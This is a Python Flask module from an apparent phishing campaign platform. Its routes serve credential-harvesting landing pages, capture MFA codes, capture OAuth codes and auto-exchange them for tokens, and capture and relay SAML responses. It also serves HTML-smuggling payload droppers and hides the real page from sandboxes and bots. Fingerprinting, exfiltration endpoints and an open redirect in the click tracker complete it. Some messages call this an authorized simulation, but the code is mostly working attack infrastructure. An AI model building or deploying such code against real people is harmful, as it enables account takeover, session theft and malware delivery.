import json
import logging
import base64
import csv
import io
import secrets
import hashlib
from io import BytesIO
from datetime import datetime, timedelta
from urllib.parse import urlparse

from flask import (
    Blueprint, request, redirect, url_for, render_template, render_template_string, session,
    send_file, jsonify, abort, flash, g, make_response, current_app
)
from dropoutjeep_lib import db
from dropoutjeep_lib.models import (
    Subsidiary, SendingProfile, Campaign, Recipient, Event, Target,
    CampaignJob, RateProfile, AutoReplyRule, PendingReply, User, AuditLog,
    TrainingCompletion, ApiToken, EmailTemplate, CampaignVersion, CanaryToken,
    Webhook, ProxyDomain, DomainReputation, SenderRotationPool,
    SenderRotationEntry, RecipientFingerprint, Redirector,
    CapturedCredential, CapturedCookie, Payload, OAuthTokenCapture, SamlCapture
)
from dropoutjeep_lib.utils.auth import (
    login_required, admin_required, operator_required, viewer_required,
    log_audit, get_current_user
)
from dropoutjeep_lib.utils.analytics import get_heatmap_data, get_recipient_timeline, export_campaign_csv, export_campaign_pdf
from dropoutjeep_lib.utils.canary import (
    get_canary_embeds, record_canary_trigger, build_canary_url
)
from dropoutjeep_lib.utils.clean_urls import build_clean_url
from dropoutjeep_lib.utils.dkim_utils import (
    generate_dkim_keypair, format_dkim_dns_record, dkim_spf_check, check_dmarc
)
from dropoutjeep_lib.utils.validator import (
    validate_campaign_before_launch, validate_smtp_relay, verify_token_sig,
    check_spf, check_dkim_selector, check_spoof_alignment
)
from dropoutjeep_lib.utils.sandbox_evasion import should_serve_real_page, is_sandbox_ua, _is_suspicious_fingerprint
from dropoutjeep_lib.utils.html_smuggler import build_dropper_for_extension, encode_payload
from dropoutjeep_lib.utils.payload_staging import list_payloads, create_payload, get_payload_for_recipient, get_payload_content
from dropoutjeep_lib.utils.domain_routing import get_recipient_proxy_url
from dropoutjeep_lib.utils.exfil import record_http_exfil, record_dns_exfil
from dropoutjeep_lib.utils.credential_format import secure_credential_inputs
from dropoutjeep_lib.utils.oauth_phish import (
    build_authorization_url, capture_auth_code, exchange_code_for_tokens
)
from dropoutjeep_lib.utils.saml_relay import capture_saml_response, relay_saml_response
from dropoutjeep_lib.utils.domain_reputation import get_or_refresh_domain_reputation
from dropoutjeep_lib.utils.risk import recipient_risk_score, campaign_risk_summary
from dropoutjeep_lib.utils.funnel import compute_funnel
from dropoutjeep_lib.utils.scheduler import sync_campaign_schedules
from dropoutjeep_lib.utils.dialer import Dialer
from dropoutjeep_lib.utils.live import push_event

tracking_bp = Blueprint('tracking', __name__)

@tracking_bp.route('/canary/<token>')
def canary_url(token):
    canary = CanaryToken.query.filter_by(token=token).first()
    if not canary:
        abort(404)
    record_canary_trigger(canary, request)
    redirect_url = canary.redirect_url or 'https://en.wikipedia.org/wiki/Phishing'
    return redirect(redirect_url)


@tracking_bp.route('/canary/<token>.gif')
def canary_image(token):
    canary = CanaryToken.query.filter_by(token=token).first()
    if not canary:
        abort(404)
    record_canary_trigger(canary, request)
    gif = BytesIO(
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!'
        b'\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00'
        b'\x00\x02\x02L\x01\x00;'
    )
    return send_file(gif, mimetype='image/gif')


def ws_events(ws):
    import json
    from dropoutjeep_lib.utils.live import register, unregister
    register(ws)
    try:
        # Send initial heartbeat so the client knows the connection is ready.
        ws.send(json.dumps({'type': 'connected'}))
        while True:
            # Keep the connection open by receiving (and ignoring) heartbeats.
            data = ws.receive(timeout=30)
            if data is None:
                break
    except Exception:
        pass
    finally:
        unregister(ws)


@tracking_bp.route('/pixel/<token>')
def pixel(token):
    r = Recipient.query.filter_by(token=token).first()
    campaign_id = r.campaign_id if r else None
    e = Event(
        campaign_id=campaign_id,
        recipient_id=r.id if r else None,
        event_type='open',
        meta=request.headers.get('User-Agent', '')
    )
    db.session.add(e)
    db.session.commit()
    push_event('open', campaign_id=campaign_id, recipient_id=r.id if r else None)
    gif = BytesIO(
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!'
        b'\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00'
        b'\x00\x02\x02L\x01\x00;'
    )
    return send_file(gif, mimetype='image/gif')


@tracking_bp.route('/track/<token>')
def track(token):
    sig = request.args.get('sig', '')
    if not verify_token_sig(token, sig):
        abort(404)
    r = Recipient.query.filter_by(token=token).first()
    campaign_id = r.campaign_id if r else None
    e = Event(
        campaign_id=campaign_id,
        recipient_id=r.id if r else None,
        event_type='click',
        meta=request.args.get('u', '')
    )
    db.session.add(e)
    db.session.commit()
    push_event('click', campaign_id=campaign_id, recipient_id=r.id if r else None)
    target = request.args.get('u')
    return redirect(target or url_for('landing', token=token))


@tracking_bp.route('/unsubscribe/<token>', methods=['GET', 'POST'])
def unsubscribe(token):
    """Handle one-click unsubscribe requests from email clients and recipients."""
    r = Recipient.query.filter_by(token=token).first()
    if r:
        from dropoutjeep_lib.utils.suppression import suppress
        suppress(r.email, source=f"unsubscribe_campaign_{r.campaign_id}")
        e = Event(
            campaign_id=r.campaign_id,
            recipient_id=r.id,
            event_type='unsubscribe',
            meta=request.headers.get('User-Agent', '')
        )
        db.session.add(e)
        db.session.commit()
        try:
            push_event('unsubscribe', campaign_id=r.campaign_id, recipient_id=r.id)
        except Exception:
            pass

    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Unsubscribed</title>
        <style>
            body { font-family: monospace; background: #f4f4f6; padding: 40px; text-align: center; }
            .card { background: white; border: 3px solid black; box-shadow: 4px 4px 0px 0px black; padding: 30px; max-width: 500px; margin: 0 auto; }
            h1 { font-size: 20px; font-weight: bold; margin-bottom: 10px; color: #000; }
            p { font-size: 14px; color: #333; }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>[ UNSUBSCRIBED ]</h1>
            <p>Your email address has been successfully unsubscribed from this communication list.</p>
            <p style="color:#666; font-size:12px; margin-top:20px;">You will receive no further messages from this campaign.</p>
        </div>
    </body>
    </html>
    """)


@tracking_bp.route('/l/<token>')
def clean_url_redirect(token):
    """Opaque clean URL that redirects to the recipient's landing or proxy path."""
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        abort(404)

    base_url = request.url_root.rstrip('/')
    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='click',
        meta='clean_url'
    )
    db.session.add(e)
    db.session.commit()
    push_event('click', campaign_id=campaign.id, recipient_id=r.id)

    if campaign.is_proxy_campaign():
        return redirect(get_recipient_proxy_url(campaign.id, token, base_url))
    return redirect(url_for('landing', token=token))


@tracking_bp.route('/track/heatmap', methods=['POST'])
def track_heatmap():
    """Receive click heatmap coordinates from landing/proxied pages."""
    data = request.get_json(silent=True) or {}
    campaign_id = data.get('campaign_id')
    token = data.get('token')
    if not campaign_id:
        return jsonify({'ok': False}), 400

    recipient = Recipient.query.filter_by(token=token).first() if token else None
    meta = {
        'x': data.get('x'),
        'y': data.get('y'),
        'selector': data.get('selector'),
        'path': data.get('path'),
    }
    db.session.add(Event(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        event_type='heatmap_click',
        meta=json.dumps(meta, default=str),
    ))
    db.session.commit()
    return jsonify({'ok': True})


def _get_recipient_and_campaign(token):
    r = Recipient.query.filter_by(token=token).first()
    if not r:
        return None, None
    campaign = Campaign.query.get(r.campaign_id)
    return r, campaign


def _get_client_ip():
    """Best-effort client IP, honoring X-Forwarded-For when behind a proxy."""
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr


@tracking_bp.route('/landing/<token>', methods=['GET', 'POST'])
def landing(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return 'Invalid token', 404

    ua = request.headers.get('User-Agent', '').lower()
    if 'bot' in ua or 'spider' in ua:
        return render_template('landing_bot_safe.html', token=token)

    ip = _get_client_ip()

    # Sandbox evasion: POSTs from a non-matching fingerprint are still recorded
    # but we do not process the credential attempt as a real submission.
    if campaign.sandbox_evasion_enabled and request.method == 'GET':
        serve_real, reason = should_serve_real_page(r, campaign, ip, request.headers.get('User-Agent', ''))
        if not serve_real:
            e = Event(
                campaign_id=campaign.id,
                recipient_id=r.id,
                event_type='visit',
                meta=json.dumps({
                    'sandbox_decision': 'safe',
                    'reason': reason,
                    'ip': ip,
                    'ua': request.headers.get('User-Agent', ''),
                }, default=str)
            )
            db.session.add(e)
            db.session.commit()
            push_event('visit', campaign_id=campaign.id, recipient_id=r.id)
            safe_html = campaign.sandbox_safe_html or render_template('landing_bot_safe.html', token=token)
            return safe_html

    if request.method == 'POST':
        inputs = {
            k: v for k, v in request.form.items(multi=False)
            if k not in ('token', 'csrf_token')
        }
        stored_inputs = secure_credential_inputs(
            inputs, plaintext=bool(campaign.store_credentials_plaintext)
        )
        e = Event(
            campaign_id=campaign.id,
            recipient_id=r.id,
            event_type='credential_attempt',
            meta=json.dumps(stored_inputs, default=str)
        )
        db.session.add(e)
        db.session.commit()
        push_event('credential_attempt', campaign_id=campaign.id, recipient_id=r.id)
        config = campaign.get_flow_config()
        if config.get('training_enabled') and campaign.flow_type != 'credential_mfa_success':
            return redirect(url_for('landing_training', token=token))
        if campaign.flow_type == 'credential_mfa_success':
            return redirect(url_for('landing_mfa', token=token))
        return render_template(
            'landing_ack.html',
            message=config.get(
                'success_message',
                'This was an authorized phishing simulation. Your submitted input has been recorded as evidence for awareness training.'
            )
        )

    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='visit',
        meta=json.dumps({
            'sandbox_decision': 'real',
            'ip': ip,
            'ua': request.headers.get('User-Agent', ''),
        }, default=str)
    )
    db.session.add(e)
    db.session.commit()
    push_event('visit', campaign_id=campaign.id, recipient_id=r.id)
    body = _render_landing_body(campaign, token)
    return body


@tracking_bp.route('/drop/<token>')
def html_smuggle_drop(token):
    """Serve an HTML smuggling dropper for an authorized payload test."""
    sig = request.args.get('sig', '')
    if not verify_token_sig(token, sig):
        abort(404)
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        abort(404)
    payload_b64 = campaign.get_html_smuggling_payload()
    if not campaign.html_smuggling_enabled or not payload_b64:
        abort(404)

    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='html_smuggle_download',
        meta=json.dumps({
            'filename': campaign.html_smuggling_filename,
            'ip': _get_client_ip(),
            'ua': request.headers.get('User-Agent', ''),
        }, default=str)
    )
    db.session.add(e)
    db.session.commit()
    push_event('html_smuggle_download', campaign_id=campaign.id, recipient_id=r.id)

    filename = campaign.html_smuggling_filename or 'document.bin'
    dropper = build_dropper_for_extension(payload_b64, filename)
    return dropper, 200, {'Content-Type': 'text/html; charset=utf-8'}


@tracking_bp.route('/landing/<token>/mfa', methods=['GET', 'POST'])
def landing_mfa(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return 'Invalid token', 404

    if campaign.flow_type != 'credential_mfa_success':
        return redirect(url_for('landing', token=token))

    if request.method == 'POST':
        code = request.form.get('code', '').strip()
        e = Event(
            campaign_id=campaign.id,
            recipient_id=r.id,
            event_type='mfa_attempt',
            meta=json.dumps({'code': code, 'note': 'mfa_code_entered'}, default=str)
        )
        db.session.add(e)
        db.session.commit()
        push_event('mfa_attempt', campaign_id=campaign.id, recipient_id=r.id)
        config = campaign.get_flow_config()
        if config.get('training_enabled'):
            return redirect(url_for('landing_training', token=token))
        return redirect(url_for('landing_success', token=token))

    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='mfa_prompt',
        meta=request.headers.get('User-Agent', '')
    )
    db.session.add(e)
    db.session.commit()
    push_event('mfa_prompt', campaign_id=campaign.id, recipient_id=r.id)
    config = campaign.get_flow_config()
    return render_template('landing_mfa.html',
                           token=token,
                           title=config.get('mfa_title', 'Two-Factor Authentication'))


@tracking_bp.route('/landing/<token>/success')
def landing_success(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return 'Invalid token', 404

    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='flow_complete',
        meta='success'
    )
    db.session.add(e)
    db.session.commit()
    push_event('flow_complete', campaign_id=campaign.id, recipient_id=r.id)
    config = campaign.get_flow_config()
    return render_template(
        'landing_success.html',
        token=token,
        redirect_url=config.get('redirect_url', 'https://en.wikipedia.org/wiki/Phishing'),
        message=config.get(
            'success_message',
            'This was an authorized phishing simulation. The MFA code you entered has been recorded as evidence for awareness training. No account was compromised.'
        )
    )


@tracking_bp.route('/landing/<token>/training')
def landing_training(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return 'Invalid token', 404

    config = campaign.get_flow_config()
    if not config.get('training_enabled'):
        return redirect(url_for('landing_success', token=token))

    training_url = config.get('training_url') or config.get('redirect_url', 'https://en.wikipedia.org/wiki/Phishing')
    tc = TrainingCompletion.query.filter_by(
        recipient_id=r.id, campaign_id=campaign.id
    ).first()
    if not tc:
        tc = TrainingCompletion(
            recipient_id=r.id,
            campaign_id=campaign.id,
            training_url=training_url,
            status='started',
            started_at=datetime.utcnow(),
        )
        db.session.add(tc)
        db.session.add(Event(
            campaign_id=campaign.id,
            recipient_id=r.id,
            event_type='training_started',
            meta=training_url,
        ))
        db.session.commit()
        push_event('training_started', campaign_id=campaign.id, recipient_id=r.id)

    return render_template(
        'landing_training.html',
        token=token,
        training_url=training_url,
        duration_seconds=config.get('training_duration_seconds', 30),
        redirect_url=config.get('redirect_url', 'https://en.wikipedia.org/wiki/Phishing'),
    )


@tracking_bp.route('/landing/<token>/training/complete', methods=['POST'])
def landing_training_complete(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return jsonify({'error': 'Invalid token'}), 404

    config = campaign.get_flow_config()
    training_url = config.get('training_url') or config.get('redirect_url', 'https://en.wikipedia.org/wiki/Phishing')
    tc = TrainingCompletion.query.filter_by(
        recipient_id=r.id, campaign_id=campaign.id
    ).first()
    if not tc:
        tc = TrainingCompletion(
            recipient_id=r.id,
            campaign_id=campaign.id,
            training_url=training_url,
        )
        db.session.add(tc)
    tc.status = 'completed'
    tc.completed_at = datetime.utcnow()
    db.session.add(tc)
    db.session.add(Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='training_completed',
        meta=training_url,
    ))
    db.session.commit()
    push_event('training_completed', campaign_id=campaign.id, recipient_id=r.id)
    return jsonify({
        'status': 'ok',
        'redirect_url': config.get('redirect_url', 'https://en.wikipedia.org/wiki/Phishing'),
    })


@tracking_bp.route('/calendar/<token>.ics')
def calendar_ics(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign or not campaign.calendar_invite:
        abort(404)

    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='calendar_download',
        meta=request.headers.get('User-Agent', '')
    )
    db.session.add(e)
    db.session.commit()
    push_event('calendar_download', campaign_id=campaign.id, recipient_id=r.id)

    from dropoutjeep_lib.utils.ics_builder import build_ics
    from dropoutjeep_lib.utils.settings import get_base_url
    sp = campaign.sending_profile
    organizer = sp.subsidiary.from_address if sp and sp.subsidiary else None
    ics = build_ics(
        event_title=campaign.calendar_event_title or 'Security Briefing',
        event_start=campaign.calendar_event_start,
        event_end=campaign.calendar_event_end,
        location=campaign.calendar_event_location or 'Conference Room A',
        description=f"Add this event to your calendar.\n\n{get_base_url()}/calendar/{token}.ics",
        organizer_email=organizer,
        uid=f"dj-{campaign.id}-{r.id}"
    )
    return ics, 200, {
        'Content-Type': 'text/calendar; charset=utf-8',
        'Content-Disposition': 'attachment; filename="invite.ics"'
    }


def _render_landing_body(campaign, token):
    from flask import request
    from dropoutjeep_lib.utils.heatmap_js import build_heatmap_script
    fp_script = url_for('static', filename='js/fingerprint.js', _external=False)
    fp_init = f"""
<script src="{fp_script}"></script>
<script>
if (typeof collectFingerprint === 'function') {{
  collectFingerprint('/api/fingerprint/{token}');
}}
</script>
"""
    heatmap_script = build_heatmap_script(campaign.id, token)
    body = campaign.landing_html.replace('{{TOKEN}}', token)
    body = body.replace('{{CLEAN_URL}}', build_clean_url(request.url_root.rstrip('/'), token))
    body = body.replace('{{FINGERPRINT_SCRIPT}}', fp_init)
    if '</body>' in body:
        body = body.replace('</body>', heatmap_script + '</body>')
    else:
        body += heatmap_script

    # Substitute active canary placeholders if any exist for this campaign.
    from dropoutjeep_lib.utils.canary import get_canary_embeds, build_canary_url
    base_url = request.url_root.rstrip('/')
    canary_embeds = get_canary_embeds(campaign.id, base_url)
    body = body.replace('{{CANARY_URL}}', canary_embeds['CANARY_URL'])
    body = body.replace('{{CANARY_IMAGE}}', canary_embeds['CANARY_IMAGE'])
    if canary_embeds['CANARY_IMAGE'] and '{{CANARY_IMAGE}}' not in campaign.landing_html:
        if '</body>' in body:
            body = body.replace('</body>', canary_embeds['CANARY_IMAGE'] + '</body>')
        else:
            body += canary_embeds['CANARY_IMAGE']

    if '</body>' in body and '{{FINGERPRINT_SCRIPT}}' not in campaign.landing_html:
        body = body.replace('</body>', fp_init + '</body>')
    return body


@tracking_bp.route('/api/fingerprint/<token>', methods=['POST'])
def api_fingerprint(token):
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return '', 204
    data = request.get_json(silent=True) or {}
    e = Event(
        campaign_id=campaign.id,
        recipient_id=r.id,
        event_type='fingerprint',
        meta=json.dumps(data, default=str)
    )
    db.session.add(e)
    db.session.commit()

    # Correlate browser fingerprint with other recipients/sessions.
    from dropoutjeep_lib.utils.fingerprint_correlation import get_or_create_recipient_fingerprint
    get_or_create_recipient_fingerprint(
        recipient=r,
        campaign_id=campaign.id,
        ip=_get_client_ip(),
        ua=request.headers.get('User-Agent'),
        device_data=data,
    )

    push_event('fingerprint', campaign_id=campaign.id, recipient_id=r.id)
    return jsonify({'status': 'ok'}), 200


@tracking_bp.route('/api/recipient/<int:recipient_id>/correlations')
@viewer_required
def api_recipient_correlations(recipient_id):
    """Return other recipients that share the same browser device fingerprint."""
    from dropoutjeep_lib.utils.fingerprint_correlation import get_recipient_correlations
    return jsonify({
        'recipient_id': recipient_id,
        'correlations': get_recipient_correlations(recipient_id),
    })


@tracking_bp.route('/api/recipient/<int:recipient_id>/correlated-events')
@viewer_required
def api_recipient_correlated_events(recipient_id):
    """Return recent events for all recipients sharing a device fingerprint."""
    from dropoutjeep_lib.utils.fingerprint_correlation import get_correlated_events
    return jsonify({
        'recipient_id': recipient_id,
        'events': get_correlated_events(recipient_id),
    })


@tracking_bp.route('/api/campaign/<int:campaign_id>/payloads')
@viewer_required
def api_list_payloads(campaign_id):
    """List payloads staged for a campaign."""
    campaign = Campaign.query.get_or_404(campaign_id)
    return jsonify({'campaign_id': campaign.id, 'payloads': list_payloads(campaign.id)})


@tracking_bp.route('/api/campaign/<int:campaign_id>/payloads', methods=['POST'])
@operator_required
def api_create_payload(campaign_id):
    """Upload a payload file for a campaign.

    Expects multipart/form-data with fields: name, file.
    Optional: per_recipient=1 to flag per-recipient polymorphic use.
    """
    campaign = Campaign.query.get_or_404(campaign_id)
    name = (request.form.get('name') or '').strip()
    uploaded = request.files.get('file')
    if not name or not uploaded or not uploaded.filename:
        return jsonify({'error': 'name and file are required'}), 400

    content = uploaded.read()
    if not content:
        return jsonify({'error': 'empty file'}), 400

    per_recipient = request.form.get('per_recipient') in ('1', 'true', 'on')
    payload = create_payload(
        campaign_id=campaign.id,
        name=name,
        filename=uploaded.filename,
        content=content,
        per_recipient=per_recipient,
    )
    if not payload:
        return jsonify({'error': 'invalid payload extension or campaign'}), 400

    log_audit('payload_created', f'campaign_id={campaign.id} payload_id={payload.id}')
    return jsonify({
        'id': payload.id,
        'name': payload.name,
        'filename': payload.filename,
        'extension': payload.extension,
        'mime_type': payload.mime_type,
        'per_recipient': payload.per_recipient,
    }), 201


@tracking_bp.route('/payload/<int:payload_id>/<token>')
def payload_dropper(payload_id, token):
    """Serve an HTML smuggling dropper for a staged payload."""
    payload, recipient, campaign = get_payload_for_recipient(payload_id, token)
    if not payload:
        abort(404)

    e = Event(
        campaign_id=campaign.id,
        recipient_id=recipient.id,
        event_type='payload_dropper_view',
        meta=json.dumps({
            'payload_id': payload.id,
            'filename': payload.filename,
            'ip': _get_client_ip(),
            'ua': request.headers.get('User-Agent', ''),
        }, default=str)
    )
    db.session.add(e)
    db.session.commit()
    push_event('payload_dropper_view', campaign_id=campaign.id, recipient_id=recipient.id)

    dropper = build_dropper_for_extension(
        encode_payload(get_payload_content(payload, recipient.token)),
        payload.filename,
        extension=payload.extension,
    )
    return dropper, 200, {'Content-Type': 'text/html; charset=utf-8'}


@tracking_bp.route('/payload/<int:payload_id>/<token>/raw')
def payload_raw_download(payload_id, token):
    """Serve the staged payload as a raw file download."""
    payload, recipient, campaign = get_payload_for_recipient(payload_id, token)
    if not payload:
        abort(404)

    e = Event(
        campaign_id=campaign.id,
        recipient_id=recipient.id,
        event_type='payload_download',
        meta=json.dumps({
            'payload_id': payload.id,
            'filename': payload.filename,
            'ip': _get_client_ip(),
            'ua': request.headers.get('User-Agent', ''),
        }, default=str)
    )
    db.session.add(e)
    db.session.commit()
    push_event('payload_download', campaign_id=campaign.id, recipient_id=recipient.id)

    return send_file(
        BytesIO(get_payload_content(payload, recipient.token)),
        mimetype=payload.mime_type,
        as_attachment=True,
        download_name=payload.filename,
    )


@tracking_bp.route('/api/exfil/<token>', methods=['POST'])
def api_exfil_http(token):
    """HTTP exfiltration endpoint for landing-page data collection."""
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return '', 204
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    ok = record_http_exfil(token, data, _get_client_ip(), request.headers.get('User-Agent'))
    if ok:
        push_event('exfil_http', campaign_id=campaign.id, recipient_id=r.id)
    return jsonify({'status': 'ok'}), 200


@tracking_bp.route('/dns-exfil')
def api_exfil_dns():
    """DNS-style exfiltration endpoint.

    Landing pages can request an image with data encoded in the query string.
    Returns a 1x1 transparent GIF and logs the data against the recipient.
    """
    token = request.args.get('token', '')
    data = request.args.get('data', '')
    if token and data:
        ok = record_dns_exfil(token, data, _get_client_ip(), request.headers.get('User-Agent'))
        if ok:
            r = Recipient.query.filter_by(token=token).first()
            if r:
                push_event('exfil_dns', campaign_id=r.campaign_id, recipient_id=r.id)
    # 1x1 transparent GIF
    gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return gif, 200, {'Content-Type': 'image/gif', 'Cache-Control': 'no-store'}


@tracking_bp.route('/oauth/start/<token>')
def oauth_start(token):
    """Redirect victim to the real OAuth authorization endpoint."""
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        abort(404)

    config = campaign.get_flow_config().get('oauth', {})
    required = ['authorization_endpoint', 'client_id', 'redirect_uri', 'scope', 'provider']
    missing = [k for k in required if not config.get(k)]
    if missing:
        abort(400, f"OAuth config missing: {missing}")

    url = build_authorization_url(
        campaign_id=campaign.id,
        recipient_token=token,
        authorization_endpoint=config['authorization_endpoint'],
        client_id=config['client_id'],
        redirect_uri=config['redirect_uri'],
        scope=config['scope'],
        extra_params=config.get('extra_params'),
    )
    return redirect(url)


@tracking_bp.route('/oauth/callback')
def oauth_callback():
    """Capture OAuth authorization code from the real provider callback."""
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')
    if error:
        return jsonify({'status': 'error', 'error': error}), 400
    if not code or not state:
        abort(400)

    from dropoutjeep_lib.utils.oauth_phish import _parse_state
    campaign_id, recipient_token = _parse_state(state)
    if not campaign_id or not recipient_token:
        abort(400)

    campaign = Campaign.query.get(campaign_id)
    if not campaign:
        abort(404)

    config = campaign.get_flow_config().get('oauth', {})
    provider = config.get('provider', 'unknown')
    capture = capture_auth_code(
        campaign_id=campaign.id,
        recipient_token=recipient_token,
        provider=provider,
        auth_code=code,
        scope=config.get('scope'),
    )

    # Optionally exchange code for tokens immediately.
    if config.get('auto_exchange') and config.get('token_endpoint') and config.get('client_secret'):
        exchange_code_for_tokens(
            capture,
            config['token_endpoint'],
            config['client_id'],
            config['client_secret'],
            config['redirect_uri'],
        )

    push_event('oauth_auth_code_capture', campaign_id=campaign.id)
    return render_template('oauth_success.html', provider=provider), 200


@tracking_bp.route('/saml/acs/<token>', methods=['POST'])
def saml_acs(token):
    """SAML Assertion Consumer Service endpoint.

    Captures the SAMLResponse from the identity provider and optionally
    relays it to the real service provider ACS.
    """
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        abort(404)

    saml_response = request.form.get('SAMLResponse', '')
    relay_state = request.form.get('RelayState')
    if not saml_response:
        abort(400, 'Missing SAMLResponse')

    config = campaign.get_flow_config().get('saml', {})
    capture = capture_saml_response(
        campaign_id=campaign.id,
        recipient_token=token,
        saml_response=saml_response,
        relay_state=relay_state,
    )

    real_acs = config.get('real_acs_url')
    if real_acs:
        relay_saml_response(capture, real_acs)

    push_event('saml_response_capture', campaign_id=campaign.id, recipient_id=r.id)
    return render_template('saml_success.html'), 200


@tracking_bp.route('/api/sandbox-check/<token>', methods=['POST'])
def api_sandbox_check(token):
    """Return whether the browser environment looks like a real user or sandbox."""
    r, campaign = _get_recipient_and_campaign(token)
    if not r or not campaign:
        return jsonify({'serve_real': True, 'reason': 'unknown_recipient'}), 200

    data = request.get_json(silent=True) or {}
    serve_real, reason = should_serve_real_page(
        r, campaign, _get_client_ip(), request.headers.get('User-Agent', ''), data
    )
    return jsonify({'serve_real': serve_real, 'reason': reason}), 200
